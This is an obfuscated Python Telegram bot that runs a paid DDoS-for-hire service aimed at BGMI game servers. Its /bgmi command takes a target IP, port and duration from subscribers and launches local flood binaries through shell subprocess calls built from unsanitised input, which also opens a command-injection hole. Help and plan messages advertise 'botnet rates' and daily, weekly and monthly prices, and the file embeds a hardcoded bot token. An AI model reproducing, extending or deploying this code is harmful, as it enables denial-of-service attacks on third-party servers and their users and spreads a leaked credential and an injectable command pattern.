import telebot #line:2
import subprocess #line:3
import datetime #line:4
import os #line:5
import time #line:6
bot =telebot .TeleBot ('7258346581:AAFhghjRWA1fSODYaf6MqRO_C9mBYQbMcl0')#line:9
ADMIN_IDS ={"1600832237"}#line:12
USER_FILE ="users.txt"#line:15
LOG_FILE ="log.txt"#line:18
COOLDOWN_TIME =300 #line:21
bgmi_cooldown ={}#line:24
def read_users ():#line:27
    try :#line:28
        with open (USER_FILE ,"r")as OOOO000O00O0O0000 :#line:29
            return set (OOOO000O00O0O0000 .read ().splitlines ())#line:30
    except FileNotFoundError :#line:31
        return set ()#line:32
allowed_user_ids =read_users ()#line:34
def log_command (OO0OO0OO0OOOOO0O0 ,O0OO0OO000O00O000 ,O0000OOOO0OOO0O0O ,O00O0OOOOO0OOO0O0 ):#line:37
    O0O0000O00O00O0OO =bot .get_chat (OO0OO0OO0OOOOO0O0 )#line:38
    OOOO00O000OO00OO0 =f"@{O0O0000O00O00O0OO.username}"if O0O0000O00O00O0OO .username else f"UserID: {OO0OO0OO0OOOOO0O0}"#line:39
    with open (LOG_FILE ,"a")as OOO0OOOO0000O0OOO :#line:41
        OOO0OOOO0000O0OOO .write (f"Username: {OOOO00O000OO00OO0}\nTarget: {O0OO0OO000O00O000}\nPort: {O0000OOOO0OOO0O0O}\nTime: {O00O0OOOOO0OOO0O0}\n\n")#line:42
def clear_logs ():#line:45
    if os .path .exists (LOG_FILE ):#line:46
        with open (LOG_FILE ,"w")as OOO000O0OOO0OO00O :#line:47
            OOO000O0OOO0OO00O .truncate (0 )#line:48
        return "Logs cleared successfully ✅"#line:49
    return "Logs are already cleared. No data found."#line:50
@bot .message_handler (commands =['add'])#line:53
def add_user (O0OOO00OOO00OOOO0 ):#line:54
    if str (O0OOO00OOO00OOOO0 .chat .id )in ADMIN_IDS :#line:55
        OOOOO0O0O0O00OOOO =O0OOO00OOO00OOOO0 .text .split ()#line:56
        if len (OOOOO0O0O0O00OOOO )>1 :#line:57
            O00OOO000000O0O0O =OOOOO0O0O0O00OOOO [1 ]#line:58
            if O00OOO000000O0O0O not in allowed_user_ids :#line:59
                allowed_user_ids .add (O00OOO000000O0O0O )#line:60
                with open (USER_FILE ,"a")as O0O0000O0O00O000O :#line:61
                    O0O0000O0O00O000O .write (f"{O00OOO000000O0O0O}\n")#line:62
                OO00O00OOO00O00O0 =f"User {O00OOO000000O0O0O} added successfully 👍."#line:63
            else :#line:64
                OO00O00OOO00O00O0 ="User already exists 🤦‍♂️."#line:65
        else :#line:66
            OO00O00OOO00O00O0 ="Please specify a user ID to add 😒."#line:67
    else :#line:68
        OO00O00OOO00O00O0 ="ONLY OWNER CAN USE."#line:69
    bot .reply_to (O0OOO00OOO00OOOO0 ,OO00O00OOO00O00O0 )#line:70
@bot .message_handler (commands =['remove'])#line:73
def remove_user (OO0O0000000OOO0OO ):#line:74
    if str (OO0O0000000OOO0OO .chat .id )in ADMIN_IDS :#line:75
        OOO0O0OO0000000OO =OO0O0000000OOO0OO .text .split ()#line:76
        if len (OOO0O0OO0000000OO )>1 :#line:77
            O00OO00OOO0OOO0OO =OOO0O0OO0000000OO [1 ]#line:78
            if O00OO00OOO0OOO0OO in allowed_user_ids :#line:79
                allowed_user_ids .remove (O00OO00OOO0OOO0OO )#line:80
                with open (USER_FILE ,"w")as OOOOOOOO0OO00O0OO :#line:81
                    OOOOOOOO0OO00O0OO .write ("\n".join (allowed_user_ids ))#line:82
                O0O0000OOO0OO0000 =f"User {O00OO00OOO0OOO0OO} removed successfully 👍."#line:83
            else :#line:84
                O0O0000OOO0OO0000 =f"User {O00OO00OOO0OOO0OO} not found in the list."#line:85
        else :#line:86
            O0O0000OOO0OO0000 ="Please specify a user ID to remove. Usage: /remove <userid>"#line:87
    else :#line:88
        O0O0000OOO0OO0000 ="ONLY OWNER CAN USE."#line:89
    bot .reply_to (OO0O0000000OOO0OO ,O0O0000OOO0OO0000 )#line:90
@bot .message_handler (commands =['clearlogs'])#line:93
def clear_logs_command (OO0O0O00OOO00OO0O ):#line:94
    O00OOOOOO000OO0OO =clear_logs ()if str (OO0O0O00OOO00OO0O .chat .id )in ADMIN_IDS else "ONLY OWNER CAN USE."#line:95
    bot .reply_to (OO0O0O00OOO00OO0O ,O00OOOOOO000OO0OO )#line:96
@bot .message_handler (commands =['allusers'])#line:99
def show_all_users (OO00OO0OOOOO0O0O0 ):#line:100
    if str (OO00OO0OOOOO0O0O0 .chat .id )in ADMIN_IDS :#line:101
        if allowed_user_ids :#line:102
            OO00O00OO0OO0O000 ="Authorized Users:\n"+"\n".join (f"- @{bot.get_chat(int(OOOO0OOOO0OO00000)).username} (ID: {OOOO0OOOO0OO00000})"if bot .get_chat (int (OOOO0OOOO0OO00000 )).username else f"- User ID: {OOOO0OOOO0OO00000}"for OOOO0OOOO0OO00000 in allowed_user_ids )#line:107
        else :#line:108
            OO00O00OO0OO0O000 ="No data found."#line:109
    else :#line:110
        OO00O00OO0OO0O000 ="ONLY OWNER CAN USE."#line:111
    bot .reply_to (OO00OO0OOOOO0O0O0 ,OO00O00OO0OO0O000 )#line:112
@bot .message_handler (commands =['logs'])#line:115
def show_recent_logs (O00OOO00OOOO0000O ):#line:116
    if str (O00OOO00OOOO0000O .chat .id )in ADMIN_IDS :#line:117
        if os .path .exists (LOG_FILE )and os .stat (LOG_FILE ).st_size >0 :#line:118
            with open (LOG_FILE ,"rb")as OO0OO000O0O0O0OO0 :#line:119
                bot .send_document (O00OOO00OOOO0000O .chat .id ,OO0OO000O0O0O0OO0 )#line:120
        else :#line:121
            bot .reply_to (O00OOO00OOOO0000O ,"No data found.")#line:122
    else :#line:123
        bot .reply_to (O00OOO00OOOO0000O ,"ONLY OWNER CAN USE.")#line:124
@bot .message_handler (commands =['id'])#line:127
def show_user_id (OO0O0OO0OO0O00OOO ):#line:128
    bot .reply_to (OO0O0OO0OO0O00OOO ,f"🤖Your ID: {str(OO0O0OO0OO0O00OOO.chat.id)}")#line:129
@bot .message_handler (commands =['bgmi'])#line:132
def handle_bgmi (O0O0O000O0O0OOO0O ):#line:133
    OO0OOO0O0O0O000OO =str (O0O0O000O0O0OOO0O .chat .id )#line:134
    if OO0OOO0O0O0O000OO in allowed_user_ids :#line:135
        if OO0OOO0O0O0O000OO not in ADMIN_IDS and OO0OOO0O0O0O000OO in bgmi_cooldown and (datetime .datetime .now ()-bgmi_cooldown [OO0OOO0O0O0O000OO ]).seconds <COOLDOWN_TIME :#line:136
            bot .reply_to (O0O0O000O0O0OOO0O ,"You are on cooldown. Please wait 5 minutes before running the /bgmi command again.")#line:137
            return #line:138
        OOOOO0O000OOO0O0O =O0O0O000O0O0OOO0O .text .split ()#line:140
        if len (OOOOO0O000OOO0O0O )==4 :#line:141
            O0O0000O0OOO000OO ,OOOOOO000O0OOOOOO ,O0OO0OOOO00O00O0O =OOOOO0O000OOO0O0O [1 ],int (OOOOO0O000OOO0O0O [2 ]),int (OOOOO0O000OOO0O0O [3 ])#line:142
            if O0OO0OOOO00O00O0O >240 :#line:143
                O0O00O0OO00OO0OO0 ="Error: Time interval must be less than 240."#line:144
            else :#line:145
                bgmi_cooldown [OO0OOO0O0O0O000OO ]=datetime .datetime .now ()#line:146
                log_command (OO0OOO0O0O0O000OO ,O0O0000O0OOO000OO ,OOOOOO000O0OOOOOO ,O0OO0OOOO00O00O0O )#line:147
                O0O00O0OO00OO0OO0 =f"𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {O0O0000O0OOO000OO}\n𝐏𝐨𝐫𝐭: {OOOOOO000O0OOOOOO}\n𝐓𝐢𝐦𝐞: {O0OO0OOOO00O00O0O} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"#line:148
                bot .reply_to (O0O0O000O0O0OOO0O ,O0O00O0OO00OO0OO0 )#line:149
                subprocess .run (f"./bgmi {O0O0000O0OOO000OO} {OOOOOO000O0OOOOOO} {O0OO0OOOO00O00O0O} 200",shell =True )#line:150
                time .sleep (5 )#line:151
                subprocess .run (f"./SOUL {O0O0000O0OOO000OO} {OOOOOO000O0OOOOOO} {O0OO0OOOO00O00O0O} 200",shell =True )#line:152
                return #line:153
        else :#line:154
            O0O00O0OO00OO0OO0 ="✅ Usage :- /bgmi <target> <port> <time>"#line:155
    else :#line:156
        O0O00O0OO00OO0OO0 ="You are not authorized to use this command."#line:157
    bot .reply_to (O0O0O000O0O0OOO0O ,O0O00O0OO00OO0OO0 )#line:158
@bot .message_handler (commands =['mylogs'])#line:161
def show_command_logs (O0O00O0OOO000O000 ):#line:162
    OOO0OOOO0OOO0O0OO =str (O0O00O0OOO000O000 .chat .id )#line:163
    if OOO0OOOO0OOO0O0OO in allowed_user_ids :#line:164
        try :#line:165
            with open (LOG_FILE ,"r")as OO0OO0O0O0000OO00 :#line:166
                O0O0O00O00OOO00OO =[O00OOO0OO000O0O0O for O00OOO0OO000O0O0O in OO0OO0O0O0000OO00 if f"UserID: {OOO0OOOO0OOO0O0OO}"in O00OOO0OO000O0O0O ]#line:167
                OOO0O0OO00OO000OO ="Your Command Logs:\n"+"".join (O0O0O00O00OOO00OO )if O0O0O00O00OOO00OO else "No command logs found for you."#line:168
        except FileNotFoundError :#line:169
            OOO0O0OO00OO000OO ="No command logs found."#line:170
    else :#line:171
        OOO0O0OO00OO000OO ="You are not authorized to use this command."#line:172
    bot .reply_to (O0O00O0OOO000O000 ,OOO0O0OO00OO000OO )#line:173
@bot .message_handler (commands =['help'])#line:176
def show_help (OOOOOOO00OO0OOO00 ):#line:177
    OO0O000000O0000O0 ='''🤖 Available commands:
💥 /bgmi : Method For Bgmi Servers. 
💥 /rules : Please Check Before Use !!.
💥 /mylogs : To Check Your Recents Attacks.
💥 /plan : Checkout Our Botnet Rates.

🤖 To See Admin Commands:
💥 /admincmd : Shows All Admin Commands.

Buy From :- @SOULCRACKS, @SOULCRACKS
Official Channel :- t.me/SOULCRACKS'''#line:189
    bot .reply_to (OOOOOOO00OO0OOO00 ,OO0O000000O0000O0 )#line:190
@bot .message_handler (commands =['start'])#line:193
def welcome_start (O0OOOO00O00O0OO00 ):#line:194
    OOOO0O0O0O0000O0O =f"👋🏻Welcome to Your Home, {O0OOOO00O00O0OO00.from_user.first_name}! Feel Free to Explore.\n🤖Try To Run This Command : /help \n✅Join :- t.me/KNIGHTMODSSRCS"#line:195
    bot .reply_to (O0OOOO00O00O0OO00 ,OOOO0O0O0O0000O0O )#line:196
@bot .message_handler (commands =['rules'])#line:199
def welcome_rules (O0OOOO0O0OOOO0O00 ):#line:200
    OOOO00OO0OO0O0O00 =f"{O0OOOO0O0OOOO0O00.from_user.first_name} Please Follow These Rules ⚠️:\n\n1. Don't Run Too Many Attacks!! Cause A Ban From Bot\n2. Don't Run 2 Attacks At Same Time Because If You Do, You Will Get Banned From Bot.\n3. We Daily Check The Logs So Follow These Rules to Avoid Ban!!"#line:201
    bot .reply_to (O0OOOO0O0OOOO0O00 ,OOOO00OO0OO0O0O00 )#line:202
@bot .message_handler (commands =['plan'])#line:205
def welcome_plan (O0000OOOO00000O0O ):#line:206
    OO00OO0O00OOOOOOO =f"{O0000OOOO00000O0O.from_user.first_name}, Brother Only 1 Plan Is Powerful Than Any Other DDoS!!:\n\nVip 🌟 :\n-> Attack Time: 180 (S)\n-> After Attack Limit: 5 Min\n-> Concurrents Attack: 3\n\nPrice List💸 :\nDay-->100 Rs\nWeek-->400 Rs\nMonth-->800 Rs"#line:207
    bot .reply_to (O0000OOOO00000O0O ,OO00OO0O00OOOOOOO )#line:208
@bot .message_handler (commands =['admincmd'])#line:211
def show_admin_commands (OOO000OOOOOOOO0O0 ):#line:212
    O0OO0O000O0OOO00O =f"{OOO000OOOOOOOO0O0.from_user.first_name}, Admin Commands Are Here!!:\n\n💥 /add <userId> : Add a User.\n💥 /remove <userid> Remove a User.\n💥 /allusers : Authorized Users Lists.\n💥 /logs : All Users Logs.\n💥 /broadcast : Broadcast a Message.\n💥 /clearlogs : Clear The Logs File."#line:213
    bot .reply_to (OOO000OOOOOOOO0O0 ,O0OO0O000O0OOO00O )#line:214
@bot .message_handler (commands =['broadcast'])#line:217
def broadcast_message (OOOO0O0OOO00O0O0O ):#line:218
    if str (OOOO0O0OOO00O0O0O .chat .id )in ADMIN_IDS :#line:219
        O0O00O0O000O00000 =OOOO0O0OOO00O0O0O .text .split (maxsplit =1 )#line:220
        if len (O0O00O0O000O00000 )>1 :#line:221
            OOO0O0O0OO00OO0O0 ="⚠️ Message To All Users By Admin:\n\n"+O0O00O0O000O00000 [1 ]#line:222
            for OOOO0OO0O000O00O0 in allowed_user_ids :#line:223
                try :#line:224
                    bot .send_message (OOOO0OO0O000O00O0 ,OOO0O0O0OO00OO0O0 )#line:225
                except Exception as OO00OO00000000OOO :#line:226
                    print (f"Failed to send broadcast message to user {OOOO0OO0O000O00O0}: {str(OO00OO00000000OOO)}")#line:227
            O0OO0OOOOOOO00OO0 ="Broadcast message sent successfully to all users 👍."#line:228
        else :#line:229
            O0OO0OOOOOOO00OO0 ="🤖 Please provide a message to broadcast."#line:230
    else :#line:231
        O0OO0OOOOOOO00OO0 ="ONLY OWNER CAN USE."#line:232
    bot .reply_to (OOOO0O0OOO00O0O0O ,O0OO0OOOOOOO00OO0 )#line:233
bot .polling ()#line:235
